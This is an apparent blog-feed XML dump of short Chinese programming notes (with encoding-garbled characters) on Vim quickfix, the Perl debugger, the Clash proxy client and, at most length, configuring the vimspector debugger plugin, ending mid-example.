  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-Clash</title>
    <link href="/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF-Clash/"/>
    <url>/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF-Clash/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-YouTube-Clash-çš„åŸºæœ¬ä½¿ç”¨"><a href="#å‚è€ƒ-YouTube-Clash-çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="å‚è€ƒ YouTube Clash çš„åŸºæœ¬ä½¿ç”¨"></a><a href="https://www.youtube.com/watch?v=9Ice-qMePQk">å‚è€ƒ YouTube Clash çš„åŸºæœ¬ä½¿ç”¨</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim-ä¸­çš„-quickfix</title>
    <link href="/2022/11/29/Vim-%E4%B8%AD%E7%9A%84-quickfix/"/>
    <url>/2022/11/29/Vim-%E4%B8%AD%E7%9A%84-quickfix/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=1MjQ3mHqdbs">å‚è€ƒ Youtube</a></p><h1 id="æ­é…-quickfix-å’Œæœç´¢"><a href="#æ­é…-quickfix-å’Œæœç´¢" class="headerlink" title="æ­é… quickfix å’Œæœç´¢"></a>æ­é… quickfix å’Œæœç´¢</h1><p>éœ€è¦ä½¿ç”¨ <code>:vimgrep</code>, å…¶ä¼šè¾“å‡ºåˆ° quickfix ä¸­. (vimgrep éœ€æŒ‡å®šæ–‡ä»¶å)</p><h1 id="æ­é…-make"><a href="#æ­é…-make" class="headerlink" title="æ­é… make"></a>æ­é… make</h1><p>make è¿è¡Œçš„ç»“æœä¼šè¾“å‡ºåˆ° quickfix ä¸­.</p><h1 id="åœ¨æ²¡æœ‰-Makefile-æ—¶è®¾ç½®-make-è¿è¡Œçš„ç¨‹åº"><a href="#åœ¨æ²¡æœ‰-Makefile-æ—¶è®¾ç½®-make-è¿è¡Œçš„ç¨‹åº" class="headerlink" title="åœ¨æ²¡æœ‰ Makefile æ—¶è®¾ç½® make è¿è¡Œçš„ç¨‹åº"></a>åœ¨æ²¡æœ‰ Makefile æ—¶è®¾ç½® make è¿è¡Œçš„ç¨‹åº</h1><p>è®¾ç½®ä¸€ä¸ªå˜é‡å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> makeprg=gcc<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>:h makeprg</code> æŸ¥çœ‹ç›¸å…³æ–‡æ¡£.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­çš„-debugger</title>
    <link href="/2022/11/29/Perl-%E4%B8%AD%E7%9A%84-debugger/"/>
    <url>/2022/11/29/Perl-%E4%B8%AD%E7%9A%84-debugger/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>$ perldoc perldebug</code> æŸ¥çœ‹æ–‡æ¡£.</p><h1 id="x-å‘½ä»¤åé¢æ˜¯-reference"><a href="#x-å‘½ä»¤åé¢æ˜¯-reference" class="headerlink" title="x å‘½ä»¤åé¢æ˜¯ reference"></a><code>x</code> å‘½ä»¤åé¢æ˜¯ reference</h1><hr><p>å¯ä»¥ç›´æ¥åœ¨ debugger ä¸­å†™ä»£ç .</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim-ä¸­æ’ä»¶-vim-spector-ä½¿ç”¨</title>
    <link href="/2022/11/29/Vim-%E4%B8%AD%E6%8F%92%E4%BB%B6-vim-spector-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/29/Vim-%E4%B8%AD%E6%8F%92%E4%BB%B6-vim-spector-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1JT4y1u7aE/?spm_id_from=333.788.recommend_more_video.2&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p>å¯ç”¨ä¸€ä¸ªè¯­è¨€çš„è°ƒè¯•å™¨, åœ¨ <code>Plug</code> ååŠ  <code>--enable</code> å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Plug <span class="hljs-string">&#x27;puremourning/vimspector&#x27;</span>, &#123;<span class="hljs-string">&#x27;do&#x27;</span>: <span class="hljs-string">&#x27;./install_gadget.py --enable-python&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„å®‰è£…ç›¸å…³ä¾èµ–.</p><p>æ³¨æ„è®¾ç½®æ¨¡æ¿æ–‡ä»¶.</p><p>åœ¨ä½¿ç”¨è¿™ä¸ªæ’ä»¶è°ƒè¯•ä¹‹å‰, é¡¹ç›®è·¯å¾„ä¸‹éœ€è¦æœ‰ <code>.vimspector.json</code> æ–‡ä»¶.</p><h1 id="vimspector-json-æ–‡ä»¶çš„ç¼–å†™"><a href="#vimspector-json-æ–‡ä»¶çš„ç¼–å†™" class="headerlink" title=".vimspector.json æ–‡ä»¶çš„ç¼–å†™"></a>.vimspector.json æ–‡ä»¶çš„ç¼–å†™</h1><p><a href="https://puremourning.github.io/vimspector/configuration.html">å‚è€ƒ</a></p><p>åŒæ ·éœ€è¦ä¸€ä¸ª Debug Adapter æ¥è¿æ¥ Vimspector å’Œå®é™…çš„ debug å·¥å…·.</p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><h3 id="æ›¿æ¢å’Œå˜é‡"><a href="#æ›¿æ¢å’Œå˜é‡" class="headerlink" title="æ›¿æ¢å’Œå˜é‡"></a>æ›¿æ¢å’Œå˜é‡</h3><p><code>$&#123;...&#125;</code> ä¸­åŒ…æ‹¬:</p><ul><li>ç¯å¢ƒå˜é‡, å¦‚ <code>$&#123;PATH&#125;</code></li><li>é¢„å®šäºå˜é‡, å¦‚ <code>$&#123;workspaceRoot&#125;</code>, <code>$&#123;file&#125;</code></li><li>ä¸æ˜¯ä¸Šè¿°å˜é‡, å…¶å€¼ä¼šåœ¨è¿è¡Œæ—¶è¦æ±‚ç”¨æˆ·è¾“å…¥</li></ul><p>å‡ ä¸ªå˜é‡çš„å«ä¹‰:</p><ul><li><code>$&#123;fileBasenameNoExtension&#125;</code>, è¡¨ç¤ºå»æ‰åç¼€çš„ç›¸å¯¹æ–‡ä»¶å, å¦‚ <code>/path/to/xyz.cc</code> &#x3D;&gt; <code>xyz</code></li><li><code>$&#123;USER&#125;</code>, ç¯å¢ƒå˜é‡ <code>USER</code></li></ul><p>ä¼ é€’ç»™ debug adapter çš„å‘½ä»¤è¡Œå‚æ•°å†™ä¸º:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-string">&quot;one&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Two&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;three&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–å†™æ³•è§æ–‡ç« .</p><h4 id="é»˜è®¤å€¼"><a href="#é»˜è®¤å€¼" class="headerlink" title="é»˜è®¤å€¼"></a>é»˜è®¤å€¼</h4><p>è¯­æ³•ä¸º:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;<span class="hljs-keyword">variable</span> name:default <span class="hljs-comment">value&#125;</span><br></code></pre></td></tr></table></figure><p><code>default value</code> å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦, é™¤äº† <code>&#125;</code> éœ€è¦è½¬ä¹‰, è¡¨ç¤º <code>\</code> éœ€è¦ç”¨ <code>\\</code>.</p><p>å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;configuration&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;program&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;script:<span class="hljs-variable">$&#123;file\\&#125;</span>&#125;</span>&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>\\&#125;</code> çš„ä½œç”¨å°±æ˜¯è½¬ä¹‰ä¸€ä¸ª <code>&#125;</code>.</p><p>è¿™é‡Œè¦æ±‚ç”¨æˆ·æŒ‡å®šä¸€ä¸ªè„šæœ¬, é»˜è®¤è·¯å¾„æ˜¯å½“å‰è„šæœ¬.</p><h4 id="å¼ºåˆ¶ç±»å‹-coercing-type"><a href="#å¼ºåˆ¶ç±»å‹-coercing-type" class="headerlink" title="å¼ºåˆ¶ç±»å‹ (coercing type)"></a>å¼ºåˆ¶ç±»å‹ (coercing type)</h4><p>å¼ºåˆ¶ä¸º <code>JSON</code> å€¼:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#json</span><br></code></pre></td></tr></table></figure><p>å¼ºåˆ¶ä¸º <code>string</code> å€¼:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#s</span><br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;stopOnEntry#json&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;stopOnEntry:true&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>stopOnEntry</code> çš„ç»“æœå°±ä¸º <code>true</code> è€Œä¸æ˜¯ <code>&quot;true&quot;</code>.</p><h2 id="é…ç½®æ ¼å¼"><a href="#é…ç½®æ ¼å¼" class="headerlink" title="é…ç½®æ ¼å¼"></a>é…ç½®æ ¼å¼</h2><p>æ‰€æœ‰çš„ Vimspector é…ç½®éƒ½è¢«å®šä¹‰åœ¨ä¸€ä¸ª JSON å¯¹è±¡ä¸­.</p><p>åŸºæœ¬æ ¼å¼ä¸º:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;adapters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> &lt;object mapping name to &lt;adapter configuration&gt; <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> &lt;object mapping name to &lt;debug configuration&gt; <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>adapters</code> é”®å€¼å¯¹æ˜¯å¯é€‰çš„, å› ä¸ºå¯ä»¥å†™åœ¨ <code>configuration</code> ä¸­.</p><h2 id="æ–‡ä»¶å’Œä½ç½®"><a href="#æ–‡ä»¶å’Œä½ç½®" class="headerlink" title="æ–‡ä»¶å’Œä½ç½®"></a>æ–‡ä»¶å’Œä½ç½®</h2><p>åªéœ€è¦ <code>.vimspector.json</code> æ–‡ä»¶ä½äºé¡¹ç›®çš„æ ¹è·¯å¾„ä¸‹.<br>å®˜æ–¹ç»™çš„ç¤ºä¾‹é…ç½®æ–‡ä»¶ä¸­æœ‰å‡ ä¸ªéœ€è¦æ›¿æ¢:</p><ul><li><code>&lt;vimspector home&gt;</code>, å®‰è£… <code>Vimspector</code> çš„è·¯å¾„, å¯ä»¥ç›´æ¥å†™è·¯å¾„, ä¹Ÿå¯ä»¥è®¾å®š <code>g:vimspector_base_dir</code> å˜é‡</li><li><code>&lt;OS&gt;</code>, è¡¨ç¤ºç³»ç»Ÿ, æ›¿æ¢ä¸º <code>linux</code>, <code>macos</code> ä¹‹ç±»</li><li><code>&lt;filetype&gt;</code>, æ›¿æ¢ä¸ºæ–‡ä»¶ç±»å‹</li></ul><h2 id="é€‚é…å™¨é…ç½®"><a href="#é€‚é…å™¨é…ç½®" class="headerlink" title="é€‚é…å™¨é…ç½®"></a>é€‚é…å™¨é…ç½®</h2><p>æ ¼å¼ä¸º:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://puremourning.github.io/vimspector/schema/gadgets.schema.json#&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;adapters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;&lt;adapter name&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      &lt;adapter configuration&gt;<br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>adapters</code> å—ä¸‹å¯ä»¥å®šä¹‰ä»»æ„æ•°é‡çš„é€‚é…å™¨. å¦‚æœå‡ ä¸ªé€‚é…å™¨ç”¨ç›¸åŒçš„åç§°, è¿è¡Œæœ€åä¸€ä¸ª.</p><h3 id="æ‰©å±•-adapters"><a href="#æ‰©å±•-adapters" class="headerlink" title="æ‰©å±• adapters"></a>æ‰©å±• adapters</h3><p>ä½¿ç”¨ <code>extends</code> é”®å€¼å¯¹æ¥ç»§æ‰¿å·²æœ‰çš„ adapter:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;adapters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;my-custom-debugpy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;extends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;debugpy&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-string">&quot;python3&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-m&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;debugpy&quot;</span> <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯ç»§æ‰¿è‡ª <code>debugpy</code> é€‚é…å™¨.</p><h2 id="Debug-é…ç½®"><a href="#Debug-é…ç½®" class="headerlink" title="Debug é…ç½®"></a>Debug é…ç½®</h2><p>å¯ä»¥æ¯ä¸ªé¡¹ç›®é…ç½®ä¸€ä¸ª, ä¹Ÿå¯ä»¥å…¨å±€ç»™æŸä¸ªæ–‡ä»¶ç±»å‹é…ç½®.</p><h3 id="é¡¹ç›®å’Œå…¨å±€é…ç½®"><a href="#é¡¹ç›®å’Œå…¨å±€é…ç½®" class="headerlink" title="é¡¹ç›®å’Œå…¨å±€é…ç½®"></a>é¡¹ç›®å’Œå…¨å±€é…ç½®</h3><p>å¯ä»¥åœ¨å‡ ä¸ªä½ç½®å¯¹é¡¹ç›®çš„ debug è¿›è¡Œé…ç½®:</p><ul><li><code>g:vimspector_configurations</code>, æŒ‡å®šç›®å½•</li><li><code>&lt;vimspector home&gt;/configurations/&lt;OS&gt;/&lt;filetypes&gt;/*.json</code></li><li><code>.vimspector.json</code>, ä½äºé¡¹ç›®ç›®å½•ä¸‹</li></ul><p>æ‰¾åˆ° <code>.vimspector.json</code> æ–‡ä»¶å, å…¶è·¯å¾„ç”¨äº <code>$&#123;workspaceRoot&#125;</code> çš„å€¼.</p><p>å‡ºç°åœ¨ <code>.vimspector.json</code> çš„é…ç½®ä¼šè¦†ç›–å…¶ä»–é…ç½®ç›®å½•ä¸‹çš„é…ç½®.</p><p>å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://puremourning.github.io/vimspector/schema/vimspector.schema.json#&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;&lt;configuration name&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;adapter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;adapter name&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;filetypes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-comment">/* list of filetypes this applies to */</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;launch or attach&gt;&quot;</span><span class="hljs-punctuation">,</span><br>        &lt;debug configuration&gt;<br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h3 id="Ad-hoc-é…ç½®-ä¸´æ—¶é…ç½®"><a href="#Ad-hoc-é…ç½®-ä¸´æ—¶é…ç½®" class="headerlink" title="Ad-hoc é…ç½® (ä¸´æ—¶é…ç½®)"></a>Ad-hoc é…ç½® (ä¸´æ—¶é…ç½®)</h3><p>å¯ä»¥è®© Vimspector å¿½ç•¥ç¡¬ç›˜ä¸Šçš„é…ç½®æ–‡ä»¶, è€Œæ˜¯ä½¿ç”¨ä¸€äº›ä¸´æ—¶é…ç½®, é€šè¿‡è°ƒç”¨:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">call</span> vimspector#LaunchWithConfigurations( dict )<br></code></pre></td></tr></table></figure><p><code>dict</code> æ˜¯å­—å…¸.</p><p>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> pid = <span class="hljs-symbol">&lt;some_expression&gt;</span><br><span class="hljs-keyword">call</span> vimspector#LaunchWithConfigurations( &#123;<br>           \  <span class="hljs-string">&quot;attach&quot;</span>: &#123;<br>           \    <span class="hljs-string">&quot;adapter&quot;</span>: <span class="hljs-string">&quot;netcoredbg&quot;</span>,<br>           \    <span class="hljs-string">&quot;configuration&quot;</span>: &#123;<br>           \      <span class="hljs-string">&quot;request&quot;</span>: <span class="hljs-string">&quot;attach&quot;</span>,<br>           \      <span class="hljs-string">&quot;processId&quot;</span>: pid<br>           \    &#125;<br>           \  &#125;<br>           \ &#125; )<br><br></code></pre></td></tr></table></figure><h3 id="é…ç½®é€‰æ‹©"><a href="#é…ç½®é€‰æ‹©" class="headerlink" title="é…ç½®é€‰æ‹©"></a>é…ç½®é€‰æ‹©</h3><p>æŒ‡å®šä¸€ä¸ª debug configuration å¹¶ä½¿ç”¨, ç”¨:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">call</span> vimspector#LaunchWithSettings( #&#123; configuration: <span class="hljs-string">&#x27;name here&#x27;</span> &#125; )<br></code></pre></td></tr></table></figure><p>è®¾ç½®é»˜è®¤çš„ debug configuration, ç”¨ <code>&quot;default&quot;: true</code> :</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;use this one&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;adapter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot; ... &quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">// ...</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;don&#x27;t use this one&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-comment">// ...</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="é˜»æ­¢è‡ªåŠ¨é€‰æ‹©"><a href="#é˜»æ­¢è‡ªåŠ¨é€‰æ‹©" class="headerlink" title="é˜»æ­¢è‡ªåŠ¨é€‰æ‹©"></a>é˜»æ­¢è‡ªåŠ¨é€‰æ‹©</h4><p>è®¾ç½® <code>&quot;autoselect&quot;: false</code>, å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Don&#x27;t use this by default!&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;autoselect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;adapter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot; ... &quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">// ...</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å…¶ä¹Ÿä¼šè¦†ç›– <code>&quot;default&quot;: true</code></p><h4 id="æ¯ä¸ªæ–‡ä»¶ç±»å‹ä¸€ä¸ªé»˜è®¤é€‰é¡¹"><a href="#æ¯ä¸ªæ–‡ä»¶ç±»å‹ä¸€ä¸ªé»˜è®¤é€‰é¡¹" class="headerlink" title="æ¯ä¸ªæ–‡ä»¶ç±»å‹ä¸€ä¸ªé»˜è®¤é€‰é¡¹"></a>æ¯ä¸ªæ–‡ä»¶ç±»å‹ä¸€ä¸ªé»˜è®¤é€‰é¡¹</h4><p>åˆ©ç”¨ <code>filetype</code>, å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;adapter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;vscode-node&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;filetypes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;auto&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;stopOnEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;console&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;integratedTerminal&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;/test.js&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Python&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;adapter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;debugpy&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;filetypes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-string">&quot;python&quot;</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;program&quot;</span><span 